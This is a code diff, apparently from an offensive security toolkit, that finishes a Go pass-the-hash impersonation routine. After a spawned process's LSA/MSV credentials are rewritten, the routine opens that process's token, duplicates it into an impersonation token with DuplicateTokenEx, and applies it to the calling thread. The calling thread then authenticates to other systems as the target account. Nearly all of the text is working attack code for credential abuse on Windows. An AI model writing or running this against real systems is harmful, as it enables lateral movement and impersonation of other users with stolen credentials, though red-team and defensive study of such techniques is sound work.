@@ -93,14 +93,80 @@ func Pass(p PTHParams) (PTHResult, error) {
 // PassImpersonate is Pass + SetThreadToken: after rewriting the
 // spawned process's LSA state, it duplicates the spawned process's
 // primary token onto the calling thread so that the operator's
-// *current* thread also outbound-authenticates as Target until the
-// impersonation token is reverted (or the thread exits).
+// *current* thread also outbound-authenticates as Target until
+// windows.RevertToSelf() is called (or the thread exits).
 //
-// CHANTIER II IN PROGRESS — the SetThreadToken step lands in the
-// final slice. Until then, PassImpersonate behaves exactly like
-// Pass (MSV write-back + resume) and surfaces no impersonation.
+// Caveat: SetThreadToken requires the duplicated token to be an
+// IMPERSONATION token. We OpenProcessToken(TOKEN_DUPLICATE | TOKEN_QUERY)
+// then DuplicateTokenEx with SecurityImpersonation level to convert
+// the spawned process's primary token into an impersonation token,
+// then SetThreadToken(nil, dup) on the calling thread.
+//
+// Not stubbed any longer — this slice ships the full path. After
+// the call returns nil, the caller's thread authenticates outbound
+// as PTHTarget. Call windows.RevertToSelf() to undo before the
+// thread exits.
 func PassImpersonate(p PTHParams) (PTHResult, error) {
-	return Pass(p)
+	res, err := Pass(p)
+	if err != nil {
+		return res, err
+	}
+	if res.PID == 0 {
+		return res, nil
+	}
+	if err := impersonateSpawnedProcess(res.PID); err != nil {
+		// MSV write succeeded; impersonation didn't. Surface as
+		// non-fatal warning so the caller can still consume the
+		// rewritten session (the spawned process is alive).
+		res.Warnings = append(res.Warnings,
+			fmt.Sprintf("PassImpersonate: SetThreadToken failed: %v", err))
+		return res, errors.Join(ErrPTHWriteFailed,
+			fmt.Errorf("SetThreadToken: %w", err))
+	}
+	return res, nil
+}
+
+// impersonateSpawnedProcess opens the spawned process, duplicates
+// its primary token into an impersonation token, and calls
+// SetThreadToken on the calling thread. Caller is responsible for
+// windows.RevertToSelf() when done.
+func impersonateSpawnedProcess(pid uint32) error {
+	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
+	if err != nil {
+		return fmt.Errorf("OpenProcess(QUERY, %d): %w", pid, err)
+	}
+	defer windows.CloseHandle(hProc)
+
+	var hPrimary windows.Token
+	if err := windows.OpenProcessToken(hProc,
+		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &hPrimary); err != nil {
+		return fmt.Errorf("OpenProcessToken: %w", err)
+	}
+	defer hPrimary.Close()
+
+	// DuplicateTokenEx → SecurityImpersonation (level 2) →
+	// TokenImpersonation type — the combination SetThreadToken
+	// accepts.
+	var hDup windows.Token
+	if err := windows.DuplicateTokenEx(
+		hPrimary,
+		windows.TOKEN_IMPERSONATE|windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE,
+		nil,
+		windows.SecurityImpersonation,
+		windows.TokenImpersonation,
+		&hDup,
+	); err != nil {
+		return fmt.Errorf("DuplicateTokenEx: %w", err)
+	}
+	// hDup ownership transfers to the thread on success — do NOT
+	// Close() it on the success path. SetThreadToken keeps a
+	// reference until RevertToSelf or thread exit.
+
+	if err := windows.SetThreadToken(nil, hDup); err != nil {
+		hDup.Close()
+		return fmt.Errorf("SetThreadToken: %w", err)
+	}
+	return nil
 }
 
 // writeBackMSV does steps 2-6 of Pass: dump+parse, locate the
